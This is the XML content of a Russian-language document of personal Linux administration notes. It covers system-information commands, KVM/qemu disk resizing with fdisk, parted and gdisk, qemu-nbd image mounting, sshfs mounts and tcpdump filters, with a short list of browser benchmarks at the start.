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style>
    <style:style style:name="P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style>
    <style:style style:name="P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a0d95" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P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9f510" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P7"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1a0d95"/>
    </style:style>
    <style:style style:name="P9"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officeooo:paragraph-rsid="001a0d95"/>
    </style:style>
    <style:style style:name="P10"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officeooo:paragraph-rsid="001a0d95"/>
    </style:style>
    <style:style style:name="P11"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style>
    <style:style style:name="P1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en" fo:country="US" officeooo:paragraph-rsid="001a0d95" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P1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bfb00" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P1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1bfb00"/>
    </style:style>
    <style:style style:name="P1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en" fo:country="US" officeooo:paragraph-rsid="001bfb00" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P16"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officeooo:paragraph-rsid="001bfb00" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P17"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18"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style>
    <style:style style:name="P19"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officeooo:paragraph-rsid="001bfb00"/>
    </style:style>
    <style:style style:name="P20"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21"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1bfb00"/>
    </style:style>
    <style:style style:name="P22"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officeooo:paragraph-rsid="001bfb00" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P2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c1f28" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P2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1c1f28"/>
    </style:style>
    <style:style style:name="P25"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paragraph-rsid="001c1f28" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P2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2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c1f28" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P28"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2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3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3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style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Times New Roman" fo:font-size="14pt" fo:language="en" fo:country="US" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T3" style:family="text">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T4" style:family="text">
      <style:text-properties fo:color="#000080" loext:opacity="100%" style:font-name="Times New Roman" fo:font-size="14pt" style:font-name-asian="Times New Roman2" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman2" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="14pt" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties style:font-name="Times New Roman1"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Тесты для браузеров:</text:p>
      <text:p text:style-name="P1">1. Использование ОЗУ после установки;</text:p>
      <text:p text:style-name="P1">2. Использование ОЗУ с 10 открытыми сайтами ((ghacks.net, startpage.com, youtube.com, betanews.com, reddit.com, slashdot.org, producthunt.com, twitch.com, amazon.com, google.com)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">3. Mozilla Kraken benchmark</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">4. JetStream benchmark</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">5. Google Octane benchmark</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">6. RoboHornet benchmark</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T1"><text:span text:style-name="T2">7. Dromaeo benchmark</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T1"><text:span text:style-name="T2">https://nlnetlabs.nl/projects/unbound/about/ - unbound </text:span><text:span text:style-name="T3">вместо</text:span><text:span text:style-name="T2"> bind. </text:span><text:span text:style-name="T3">UNBOUND (https://nlnetlabs.nl/projects/unbound/about/) - DNS-сервер с открытым кодом. Разработка NLnet Labs, VeriSign, Nominet и Kirei. Является рекурсивным, кэширующим DNS-сервером, соответствующим стандартам, и позиционируется как высокопроизводительная альтернатива наиболее распространенному решению в этой области — BIND. Похожие продукты в Кладовке: Simple DNSCrypt, dnscrypt-proxy, Nebulo.</text:span></text:p>
      <text:p text:style-name="P4">Быстрый совет по Linux для поиска всех файлов, которые были изменены за последние 5 минут: find . -type f -mmin -5. Полезно, когда вы устраняете неполадки и хотите знать, какие файлы были недавно изменены.</text:p>
      <text:p text:style-name="P1">Полезные команды Linux. Получение различной информации о системе: # arch</text:p>
      <text:p text:style-name="P1">Вывести на экран архитектуру компьютера: # uname -m</text:p>
      <text:p text:style-name="P1">Так-же выводит архитектуру компьютера: # cal 2010</text:p>
      <text:p text:style-name="P1">Печатает календарь на 2010 год. Без аргументов выводит календарь на текущий месяц: # cat /proc/cpuinfo</text:p>
      <text:p text:style-name="P1">Вывести подробную информацию о процессоре: # cat /proc/interrupts</text:p>
      <text:p text:style-name="P1">Вывести информацию о прерываниях: # cat /proc/meminfo</text:p>
      <text:p text:style-name="P1">Выводит статистику использования памяти: # cat /proc/swaps</text:p>
      <text:p text:style-name="P1">Вывести информацию о swap файле(ах) (файл подкачки): # cat /proc/version</text:p>
      <text:p text:style-name="P1">Вывести информацию о версии текущего ядра: # cat /proc/net/dev</text:p>
      <text:p text:style-name="P1">Вывести информацию и статистику по сетевым устройствам: # cat /proc/mounts</text:p>
      <text:p text:style-name="P1">Показать смонтированные файловые системы: # clock -w</text:p>
      <text:p text:style-name="P5">Записать текущую системную дату в BIOS: # date</text:p>
      <text:p text:style-name="P5">Вывести текущую системную дату и время: </text:p>
      <text:p text:style-name="P6"># date 041217002007.00</text:p>
      <text:p text:style-name="P6">Установить дату и время в значение МесяцДеньЧасМинутаГод.Секунда: # dmidecode -q</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Вывести в читабельном виде информацию по аппаратному оборудованию системы (SMBIOS / DMI): # hdparm -i /dev/hda</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>Вывести характеристики жесткого диска: # hdparm -tT /dev/sda</text:p>
      <text:p text:style-name="P1">Измерять скорость чтения данных с жесткого диска: # lspci -tv</text:p>
      <text:p text:style-name="P1">Вывести список устройств на шине PCI: # lsusb -tv</text:p>
      <text:p text:style-name="P4">Вывести список устройств на USB шине: # uname -r</text:p>
      <text:p text:style-name="P1">KVM изменить размер диска / blockresize / domblklist / guests linux / mbr /gpt</text:p>
      <text:p text:style-name="P1">Изменение диска offline / qemu-img</text:p>
      <text:p text:style-name="P1">!!! не забываем делать backup</text:p>
      <text:p text:style-name="P7">qemu-img resize vmdisk.qcow2 +10G - добавим 10Гб диску vmdisk.img</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Изменение</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">диска</text:span><text:span text:style-name="T2"> online / blockresize</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">virsh blockresize &lt;domain&gt; &lt;path&gt; &lt;size&gt;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="3"/></text:span><text:span text:style-name="T3">[--domain] &lt;строка&gt; <text:s/>имя домена, ID или UUID</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>[--path] &lt;строка&gt; <text:s/>Полный путь к блочному устройству</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>[--size] &lt;число&gt; <text:s/>Новый размер блочного устройства, кратный целому числу (по умолчанию в КиБ)</text:p>
      <text:p text:style-name="P1">virsh domblklist name_VM - узнаем какие диски есть у ВМ</text:p>
      <text:p text:style-name="P7">virsh blockresize name_VM /kvm/name_VM_disk.qcow2 100G - для ВМ (name_VM), изменим размер диска равный 100Гб</text:p>
      <text:p text:style-name="P1">Необходимые действия для гостя, при изменении диска, MBR диск / один раздел / fdisk:</text:p>
      <text:p text:style-name="P1">!!! Не забываем делать backup </text:p>
      <text:p text:style-name="P1">!!! Внимание пример для одного диска с одним разделом</text:p>
      <text:p text:style-name="P1">!!! fdisk -l - посмотреть доступные</text:p>
      <text:p text:style-name="P5"><text:s/>fdsik /dev/sda - редактируем таблицу разделов</text:p>
      <text:p text:style-name="P5"><text:s text:c="3"/>: p - показываем таблицу разделов</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>Устр-во <text:s text:c="3"/>Загрузочный Start Конец Секторы Size Id Тип</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>/dev/sda1 <text:s/>* <text:s text:c="11"/>2048 14678015 14675968 <text:s text:c="2"/>7G 83 Linux</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>: d - удаляем таблицу разделов</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="3"/></text:span><text:span text:style-name="T2">: n - </text:span><text:span text:style-name="T3">создаем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">таблицу</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">разделов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="3"/>Do you want to remove the signature? </text:span><text:span text:style-name="T3">[Y]es/[N]o: N - не удаляем сигнатуры</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>: a - ставим ставим загрузочный бит</text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>: w - применяем изменения</text:p>
      <text:p text:style-name="P5">!!! после выхода из (fdisk) будет сказано что изменена таблица разделов и необходимо выполнить partprobe</text:p>
      <text:p text:style-name="P5">(name_VM)# partprobe - выполняем просим систему перечитать таблицу разделов</text:p>
      <text:p text:style-name="P7">(name_VM)# resize2fs /dev/sda1 - выполняем изменения FS</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Необходимые действия для гостя, при изменении диска, MBR диск / несколько разделов / parted:</text:span></text:p>
      <text:p text:style-name="P1">!!! Не забываем делать backup </text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>!!! Внимание пример для одного диска и нескольких разделов</text:p>
      <text:p text:style-name="P1">!!! fdisk -l - посмотреть доступные</text:p>
      <text:p text:style-name="P1">Пример (parted)</text:p>
      <text:p text:style-name="P1">(name_VM)# parted /dev/vda - открываем нужный диск</text:p>
      <text:p text:style-name="P1"><text:s text:c="11"/>(parted) print free - покажем доступные <text:s/>разделы (диск /dev/vda)</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="15"/></text:span><text:span text:style-name="T2">Number Start End Size Type File system Flags</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="15"/>1 32.3kB 4295MB 4295MB primary ext4 boot</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="15"/>2 4295MB 8590MB 4295MB primary linux-swap(v1)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="15"/>3 8590MB 107GB 98GB primary ext4</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="17"/>107GB 215GB 107GB Free Space</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="11"/></text:span><text:span text:style-name="T3">(parted) resizepart 3 - изменяем размер третьего раздела</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="15"/></text:span><text:span text:style-name="T2">End [107GB]? 215GB</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="11"/>(parted) quit - </text:span><text:span text:style-name="T3">выходим</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">из</text:span><text:span text:style-name="T2"> parted</text:span></text:p>
      <text:p text:style-name="P1">(name_VM)#partprobe - выполняем просим систему перечитать таблицу разделов</text:p>
      <text:p text:style-name="P7">(name_VM)#resize2fs /dev/vda3 - <text:s/>выполняем изменения FS</text:p>
      <text:p text:style-name="P1">Необходимые действия для гостя, при изменении диска, GBT диск / несколько разделов / parted: !!! GPT Рассматривается схема с одним разделом (/dev/vdb1) на весь диск</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(name_VM)#partprobe</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(name_VM)#gdisk /dev/vdb</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/></text:span><text:span text:style-name="T3">переходим в расширенный режим x</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>смещаем запись в конец диска e</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>выходим из расширенного режима m</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>Command (? for help): d</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="2"/></text:span><text:span text:style-name="T2">Using 1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Command (? for help): n</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Partition number (1-128, default 1): [Enter]</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>First sector (34-2147483614, default = 2048) or {+-}size{KMGTP}: [Enter]</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Last sector (2048-2147483614, default = 2147483614) or {+-}size{KMGTP}: [Enter]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Current type is 'Linux filesystem'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Hex code or GUID (L to show codes, Enter = 8300): [Enter]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Changed type of partition to 'Linux filesystem'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/></text:span><text:span text:style-name="T3">выходим с сохранением w</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(name_VM)#partprobe</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(name_VM)#resize2fs /dev/vdb1 </text:span><text:span text:style-name="T3">или</text:span></text:p>
      <text:p text:style-name="P9" loext:marker-style-name="T1"><text:span text:style-name="T2">btrfs filesystem resize max /&lt;MOUNTPOINT&gt;</text:span></text:p>
      <text:p text:style-name="P10" loext:marker-style-name="T1"><text:span text:style-name="T3">Смонтировать образ диска qcow2 в гипервизоре:</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2">modprobe nbd max_part=8</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2">qemu-nbd --connect=/dev/nbd0 &lt;PATH-TO-IMAGE&gt;.qcow2</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">fdisk /dev/nbd0 -l</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mount -o ro /dev/nbd0p1 /mnt/ext0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">umount /mnt/ext0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">qemu-nbd --disconnect /dev/nbd0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">rmmod nbd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ssh - sshfs </text:span><text:span text:style-name="T3">монтирование</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">шары</text:span></text:p>
      <text:p text:style-name="P1">SSHFS - монтирование файловых систем средствами ssh</text:p>
      <text:p text:style-name="P1">apt-get install sshfs - установка</text:p>
      <text:p text:style-name="P1">mkdir /mnt/docs - создаем папку для монтирования</text:p>
      <text:p text:style-name="P1">sshfs user@server.com:/var/docs /mnt/docs - монтируем фс используя sshfs</text:p>
      <text:p text:style-name="P1">fusermount -u /var/docs - демонтируем удаленную папку</text:p>
      <text:p text:style-name="P1">монтирование шары sshfs /etc/fstab:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">ИМЯ</text:span><text:span text:style-name="T2">@</text:span><text:span text:style-name="T3">ИП</text:span><text:span text:style-name="T2">:/REMOTE/DIR <text:s/>/LOCAL/MOUNT <text:s/>fuse.sshfs _netdev,user,idmap=user,transform_symlinks,identityfile=/home/</text:span><text:span text:style-name="T3">ИМЯ</text:span><text:span text:style-name="T2">/.ssh/id_rsa,allow_other,default_permissions,uid=</text:span><text:span text:style-name="T3">ИД</text:span><text:span text:style-name="T2">,gid=</text:span><text:span text:style-name="T3">ИД</text:span><text:span text:style-name="T2"> 0 0</text:span></text:p>
      <text:p text:style-name="P1">sshfs для windows:</text:p>
      <text:p text:style-name="P1">Dokan SSHFS - монтирование удаленного сетевого хранилища при помощи ssh для Windows</text:p>
      <text:p text:style-name="P1">https://github.com/dokan-dev/dokany/releases/tag/v1.1.0.2000</text:p>
      <text:p text:style-name="P1">sshfs - монтирование удаленной папки подробней:</text:p>
      <text:p text:style-name="P1">Fuse - это модуль ядра (недавно он был принят в официальную ветку 2.6), позволяющий непривилегированным пользователям монтировать различные</text:p>
      <text:p text:style-name="P1">файловые системы. </text:p>
      <text:p text:style-name="P1">Sshfs - это программа, созданная самим автором fuse, которая позволяет монтировать удаленные папки или файловые системы, используя ssh. </text:p>
      <text:p text:style-name="P5">Суть проста - удаленная папка монтируются в папку локальной файловой системы. <text:s/>После этого все операции над этой папкой производятся, как если бы это была обычная локальная папка, с той только разницей, что файлы перемещаются через ssh в фоновом режиме. После установки программы остается только добавить пользователя, которому мы хотим предоставить право на монтирование файловых систем через ssh, в группу fuse.</text:p>
      <text:p text:style-name="P12"># usermod -G -a fuse user1</text:p>
      <text:p text:style-name="P1">или</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># adduser user1 fuse</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">вручную</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">отредактировав</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> /etc/group. </text:span></text:p>
      <text:p text:style-name="P1">Также необходимо, чтобы был загружен модуль fuse:</text:p>
      <text:p text:style-name="P1"># modprobe fuse</text:p>
      <text:p text:style-name="P1">Если мы планируем использовать fuse и sshfs регулярно, то нужно добавить fuse в файл /etc/modules. </text:p>
      <text:p text:style-name="P1">sshfs user1@remote_server:/tmp ~/remote_folder - смонтировать удаленную папку с помощью sshfs</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">fusermount -u ~/remote_folder - мы можем отмантировать ее</text:span></text:p>
      <text:p text:style-name="P1">Если мы постоянно работаем с этой папкой, то можно добавить ее в таблицу /etc/fstab. </text:p>
      <text:p text:style-name="P1">При этом она будет автоматически монтироваться при загрузке системы,</text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">/tmp /home/user1/remote_folder/ fuse defaults,auto 0 0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump / </text:span><text:span text:style-name="T3">снифер</text:span><text:span text:style-name="T2"> / sniffer</text:span></text:p>
      <text:p text:style-name="P1">Установка</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">yum install tcpdump - </text:span><text:span text:style-name="T3">установка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> centos</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt install tcpdump - </text:span><text:span text:style-name="T3">установка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> debian</text:span></text:p>
      <text:p text:style-name="P1">Опции утилиты tcpdump:</text:p>
      <text:p text:style-name="P1">-i интерфейс # Задает интерфейс, с которого необходимо анализировать трафик (без указания интерфейса - анализ "первого попавшегося")</text:p>
      <text:p text:style-name="P1">-n # Отключает преобразование IP в доменные имена. Если указано -nn, то запрещается преобразование номеров портов в название протокола.</text:p>
      <text:p text:style-name="P1">-e # Включает вывод данных канального уровня (например, MAC-адреса).</text:p>
      <text:p text:style-name="P1">-v # Вывод дополнительной информации (TTL, опции IP).</text:p>
      <text:p text:style-name="P1">-s размер # Указание размера захватываемых пакетов. (по умолчанию - пакеты больше 68 байт)</text:p>
      <text:p text:style-name="P1">-w имя_файла # Задать имя файла, в который сохранять собранную информацию.</text:p>
      <text:p text:style-name="P1">-r имя_файла # Чтение дампа из заданного файла.</text:p>
      <text:p text:style-name="P1">-p # Захватывать только трафик, предназначенный данному узлу. (по умолчанию - захват всех пакетов, например в том числе широковещательных).</text:p>
      <text:p text:style-name="P1">-q # Переводит tcpdump в "бесшумный режим", пакет анализируется на транспортном уровне (протоколы TCP, UDP, ICMP), а не на сетевом (протокол IP).</text:p>
      <text:p text:style-name="P7">-t # Отключает вывод меток времени.</text:p>
      <text:p text:style-name="P1">Наиболее часто используемые фильтрующие параметры команды tcpdump:</text:p>
      <text:p text:style-name="P1">dst хост # Проверяет, совпадает ли адрес получателя IP-пакета с указанным значением. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:p>
      <text:p text:style-name="P1">src хост # Проверяет, совпадает ли адрес отправителя IP пакета с указанным значением. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:p>
      <text:p text:style-name="P5">host хост # Проверяет, совпадает ли адрес отправителя или получателя с заданным значением. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:p>
      <text:p text:style-name="P5">net имя_сети # Проверяется, находится ли адрес отправителя/получателя в заданной сети. Возможно указание сети в формате CIDR (например, 10.0.0.1/22), либо указание имени сети, заданной в файле /etc/networks.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">ip | arp | rarp | tcp | udp | icmp [хост] # Проверяет, принадлежит ли пакет одному из указанных протоколов и при указании адреса хоста проверяет, </text:span><text:soft-page-break/><text:span text:style-name="T3">совпадает ли адрес отправителя\получателя с заданным. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:span></text:p>
      <text:p text:style-name="P1">[tcp | udp] dst port номер_порта # Проверяется, принадлежит ли пакет протоколу TCP/UDP и равен ли порт назначения заданному. Можно указать номер порта, либо имя, заданное в файле /etc/services.</text:p>
      <text:p text:style-name="P1">[tcp | udp] src port номер_порта # Проверяется, принадлежит ли пакет протоколу TCP/UDP и равен ли порт источника заданному. Можно указать номер порта, либо имя, заданное в файле /etc/services.</text:p>
      <text:p text:style-name="P1">[tcp | udp] port номер_порта # Проверяется, принадлежит ли пакет протоколу TCP/UDP и равен ли порт назначения или источника заданному.</text:p>
      <text:p text:style-name="P1">Можно указать номер порта, либо имя, заданное в файле /etc/services.</text:p>
      <text:p text:style-name="P1">ether { src | dst | host } MAC_адрес # Проверяется, принадлежит ли сетевой пакет источнику, назначению, источнику или назначению имеющему заданный MAC_адрес.</text:p>
      <text:p text:style-name="P1">ip broadcast # Проверяется, является ли IP пакет широковещательным.</text:p>
      <text:p text:style-name="P7">ether broadcast # Проверяется, является ли ARP-пакет широковещательным.</text:p>
      <text:p text:style-name="P1">Примеры использования tcpdump:</text:p>
      <text:p text:style-name="P1">tcpdump -i eth0 # слушаем интерфейс eth0</text:p>
      <text:p text:style-name="P1">tcpdump port 80 # слушаем 80 порт</text:p>
      <text:p text:style-name="P1">tcpdump host google.com # слушаем трафик с хоста google.com</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -n -i eth0 icmp # </text:span><text:span text:style-name="T3">Ловим</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакеты</text:span><text:span text:style-name="T2"> icmp (ping pong)</text:span></text:p>
      <text:p text:style-name="P1">tcpdump | grep -v ssh # поиск пакетов исключая пакеты ssh</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -n -i eth0 net 192.168.1.15 # </text:span><text:span text:style-name="T3">трафик</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2">/</text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> IP</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -n -i eth0 net 192.168.1.0/24 # </text:span><text:span text:style-name="T3">трафик</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2">/</text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сеть</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -l &gt; dump &amp;&amp; tail -f dump # </text:span><text:span text:style-name="T3">Вывод</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">записью</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span></text:p>
      <text:p text:style-name="P1">tcpdump -i eth0 -w traffic.eth0 # Информация о трафике записывается в бинарный файл traffic.eth0</text:p>
      <text:p text:style-name="P1">tcpdump -i eth0 -s 0 -w traffic.eth0 # Запись + загрузка в бинарный файл</text:p>
      <text:p text:style-name="P1">tcpdump -r traffic.eth0 # Читаем из файла</text:p>
      <text:p text:style-name="P1">tcpdump -i eth0 -X port \(110 or 143\) # Проверка pop и imap на безопасность</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -i eth0 -s 0 -A port 80 | grep GET # (-s 0 </text:span><text:span text:style-name="T3">весь</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакет</text:span><text:span text:style-name="T2">, -A </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> ASCII)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcpdump -npi iface_name ether src MAC-address # </text:span><text:span text:style-name="T3">узнать</text:span><text:span text:style-name="T2"> MAC </text:span><text:span text:style-name="T3">устройства</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iface_name -</text:span><text:span text:style-name="T3">имя</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">интерфейса</text:span><text:span text:style-name="T2"> MAC-address -</text:span><text:span text:style-name="T3">мак</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">адрес</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">устройства</text:span></text:p>
